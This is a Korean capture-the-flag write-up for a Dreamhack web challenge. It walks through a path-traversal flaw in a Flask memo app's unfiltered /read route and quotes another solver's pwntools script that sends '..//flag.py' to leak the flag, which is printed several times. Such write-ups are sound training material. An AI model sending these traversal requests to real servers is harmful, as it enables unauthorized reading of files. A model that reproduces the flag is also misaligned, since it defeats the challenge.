@@ -1,0 +1,107 @@
+FLAG = 'DH{uploading_webshell_in_python_program_is_my_dream}'
+
+웹사이트 구성을 보면 upload memo를 한후 upload한 메모를 클릭해 내용을 볼수 있다
+
+http://host1.dreamhack.games:19515/read?name=memo
+url이 이런식이면 memo의 내용을 불러온다
+
+@APP.route('/upload', methods=['GET', 'POST'])
+def upload_memo():
+    if request.method == 'POST':
+        filename = request.form.get('filename')
+        content = request.form.get('content').encode('utf-8')
+
+        if filename.find('..') != -1:
+            return render_template('upload_result.html', data='bad characters,,')
+
+        with open(f'{UPLOAD_DIR}/{filename}', 'wb') as f:
+            f.write(content)
+
+        return redirect('/')
+
+    return render_template('upload.html')
+
+file upload, download 공격을 하려고 ../ 등 상위 path로 가려고 하면 .. filtering이 있어 
+상위 path로 못간다.
+
+@APP.route('/read')
+def read_memo():
+    error = False
+    data = b''
+
+    filename = request.args.get('name', '')
+
+    try:
+        with open(f'{UPLOAD_DIR}/{filename}', 'rb') as f:
+            data = f.read()
+    except (IsADirectoryError, FileNotFoundError):
+        error = True
+
+
+    return render_template('read.html',
+                           filename=filename,
+                           content=data.decode('utf-8'),
+                           error=error)
+
+하지만 upload한 memo를 불러오는 function을 보면 필터링을 하지 않는다.
+name의 파라미터 값이 검증 과정을 거치지 않기 때문에 이용한다
+필터링을 하지 않는 read_memo를 이용해 flag를 읽어 온다.
+
+memo를 읽으려고 서버에서 다운받을때 url을 살펴보면
+http://host1.dreamhack.games:19515/read?name=memo
+이런식으로 불러온다.
+
+memo라는 name을 다운받아 읽는 것이다.
+즉 name = flag.py를 하면 flag.py를 불러와야 하나 같은 폴더에 존재하지 않아서 에러가 발생한다.
+
+상위 디렉터리에서 확인해 보니 내용을 불러올수 있었다.
+
+FLAG = 'DH{uploading_webshell_in_python_program_is_my_dream}'
+
+
+
+다른 사람 답 :
+    pwntools로 RAW HTTP request를 보내주는 방식으로 해결하였다.
+    근데 다른 사람들 풀이를 보니까 더 쉽게 되네… 웹 어렵다 ㅠ
+
+    from pwn import *
+
+    HOST = 'host1.dreamhack.games'
+    PORT = 15056
+
+    r = remote(HOST,PORT)
+
+    def modify(s,**kwargs):
+        return s.format(**kwargs).replace('\n','\r\n').encode('utf-8')
+
+    def receive():
+        res = ''
+        while True:
+            try:
+                res += r.recv().decode('utf-8')
+            except:
+                break
+        return res
+
+    if __name__ == '__main__':
+        payload ='''GET /read?name=..//flag.py HTTP/1.1
+        Host: {host}
+        User-Agent: fisma
+
+        '''
+        payload = modify(payload,host=HOST)
+        r.send(payload)
+        res = receive()
+        print(res)
+    이렇게 보내면, flag.py의 내용이 출력이 된다. 출력결과를 잘 살펴보면 flag를 얻을 수 있다.
+        <h1>..//flag.py Memo</h1><br />
+        <div>
+            <div class="col-md-12 form-group">
+                <label for="FileData">Content</label>
+                <textarea id="FileData" class="form-control" rows="5" name="content" readonly>Flag = $#39;DH{uploading_webshell_in_python_program_is_my_dream}$#39;</textarea>
+            </div>
+        </div>
+
+
+파일 업로드에는 상위 경로 접근에 대한 기본적인 필터링이 적요되어 있는 반면에 파일을 다운로드 받기 위해 url에 접근하는 과정에는 필터링이 없다. 따라서 매개변수로 받는 filename에 경로를 넣어주어 플래그값을 가져온다
+?filename=…/flag.py
